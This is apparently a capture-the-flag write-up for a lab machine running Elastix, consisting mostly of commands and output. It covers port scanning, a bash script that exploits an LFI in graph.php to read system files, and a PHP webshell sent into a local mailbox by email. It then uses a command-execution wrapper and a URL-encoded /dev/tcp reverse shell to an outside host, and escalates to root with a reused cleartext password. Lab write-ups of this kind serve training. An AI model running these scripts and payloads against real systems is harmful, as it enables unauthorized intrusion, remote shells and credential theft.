# Recon

```bash
nmap -p- -oA scans/nmap-alltcp 10.10.10.7

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
881/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
```

```bash
nmap -p 22,25,80,110,111,143,443,881,993,995,3306,4190,4445,4559,4038,10000 -sVC -oA scans/nmap-tcpdetail 10.10.10.7
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open   smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open   http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open   pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING TOP EXPIRE(NEVER) APOP USER AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) LOGIN-DELAY(0) STLS UIDL RESP-CODES
111/tcp   open   rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            878/udp   status
|_  100024  1            881/tcp   status
143/tcp   open   imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed X-NETSCAPE IMAP4rev1 THREAD=ORDEREDSUBJECT ANNOTATEMORE OK CATENATE LIST-SUBSCRIBED RIGHTS=kxte MAILBOX-REFERRALS UNSELECT IDLE ACL CONDSTORE URLAUTHA0001 THREAD=REFERENCES SORT=MODSEQ IMAP4 MULTIAPPEND SORT LITERAL+ STARTTLS NO UIDPLUS RENAME BINARY CHILDREN QUOTA ATOMIC ID NAMESPACE LISTEXT
443/tcp   open   ssl/http   Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2023-08-23T06:56:01+00:00; +4s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
881/tcp   open   status     1 (RPC #100024)
993/tcp   open   ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open   pop3       Cyrus pop3d
3306/tcp  open   mysql      MySQL (unauthorized)
4038/tcp  closed fazzt-ptp
4190/tcp  open   sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open   upnotifyp?
4559/tcp  open   hylafax    HylaFAX 4.3.10
10000/tcp open   http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 3s
```

```bash
feroxbuster -o scans/endpoints -u https://10.10.10.7 -k --no-recursion

301      GET        9l       28w      309c https://10.10.10.7/admin => https://10.10.10.7/admin/
301      GET        9l       28w      310c https://10.10.10.7/images => https://10.10.10.7/images/
301      GET        9l       28w      311c https://10.10.10.7/modules => https://10.10.10.7/modules/
301      GET        9l       28w      308c https://10.10.10.7/help => https://10.10.10.7/help/
301      GET        9l       28w      307c https://10.10.10.7/var => https://10.10.10.7/var/
301      GET        9l       28w      308c https://10.10.10.7/mail => https://10.10.10.7/mail/
301      GET        9l       28w      310c https://10.10.10.7/static => https://10.10.10.7/static/
301      GET        9l       28w      308c https://10.10.10.7/lang => https://10.10.10.7/lang/
301      GET        9l       28w      308c https://10.10.10.7/libs => https://10.10.10.7/libs/
301      GET        9l       28w      309c https://10.10.10.7/panel => https://10.10.10.7/panel/
301      GET        9l       28w      311c https://10.10.10.7/configs => https://10.10.10.7/configs/
```

# Shell as asterisk

When we first look at http page available under port 80, we notice
Elastix login page:

```bash
searchsploit elastix
-------------------------------------------------------------- -----------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- -----------------------
Elastix - 'page' Cross-Site Scripting                         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities       | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion              | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                             | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                            | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution        | php/webapps/18650.py
-------------------------------------------------------------- -----------------------
```

As we can see, it might be vulnerable to some CVE's, but since we don't know the
version, we might not be able to exploit any of them.

After trying poc's of these vulnerabilities LFI one worked.
This version of Elastix has LFI under graph.php in current_language field.
We've written simple exploit script for this vulnerability:

```bash
#!/bin/bash

path="/etc/passwd"

if [ $# -eq 1 ]
  then
    path=$1
fi

curl -s -k \
    "https://10.10.10.7/vtigercrm/graph.php?current_language=
../../../../../$path%00&module=Accounts&action"\
    | head -n -1
```

We read /etc/passwd file in order to get some possible users
for smtp:

```bash
root:x:0:0:root:/root:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

After some trial and error, we were able to properly send and read (using LFI)
test mail to one of the users:

```bash
swaks \
    --to asterisk@localhost \
    --from jjs@jjs.jjs \ 
    --header "Subject: Testing" \ 
    --body "ignore me" \ 
    --server 10.10.10.7
```

```
./elastix_lfi.sh /var/mail/asterisk
From jjs@jjs.jjs  Wed Aug 23 12:06:06 2023
Return-Path: <jjs@jjs.jjs>
X-Original-To: asterisk@localhost
Delivered-To: asterisk@localhost.localdomain
Received: from kali (unknown [10.10.14.23])
	by beep.localdomain (Postfix) with ESMTP id E77ADD92FD
	for <asterisk@localhost>; Wed, 23 Aug 2023 12:06:05 +0300 (EEST)
Date: Wed, 23 Aug 2023 05:05:51 -0400
To: asterisk@localhost
From: jjs@jjs.jjs
Subject: Testing
Message-Id: <20230823050551.074246@kali>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

ignore me
```

After that, we will just upload php webshell and then use it to gain reverse shell:

```bash
swaks \
    --to asterisk@localhost \
    --from jjs@jjs.jjs \ 
    --header "Subject: Testing" \ 
    --body "<?php system(\$_REQUEST['cmd']); ?>" \ 
    --server 10.10.10.7
```

Script for using webshell:
```bash
#!/bin/bash

cmd="id"

if [ $# -eq 1 ]
  then
    cmd=$1
fi

curl -s -k \
    "https://10.10.10.7/vtigercrm/graph.php?current_language=
../../../../../../..//var/mail/asterisk%00&module=Accounts&action&cmd=$cmd"\
    | tail -n +33 | head -n -3
```

We will use it with url-encoded bash reverse shell, after starting listener
under port 9001:
```bash
./rce.sh "%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.23%2F9001%200%3E%261"
```

We should receive reverse connection granting us shell as asterisk.

# Shell as root
After some enumeration of the system, we encounter amportal.conf file
in root directory. It contains some passwords. As it turns out, one 
of them is the password for root user!

```bash
bash-3.2$ su     
standard in must be a tty
bash-3.2$ which python python2 python3
which: no python3 in (/sbin:/usr/sbin:/bin:/usr/bin)
/usr/bin/python
/usr/bin/python2
bash-3.2$ /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
bash-3.2$ su
Password: jEhdIekWmdjE
cat /root/root.txt
2f4**************************06f
```
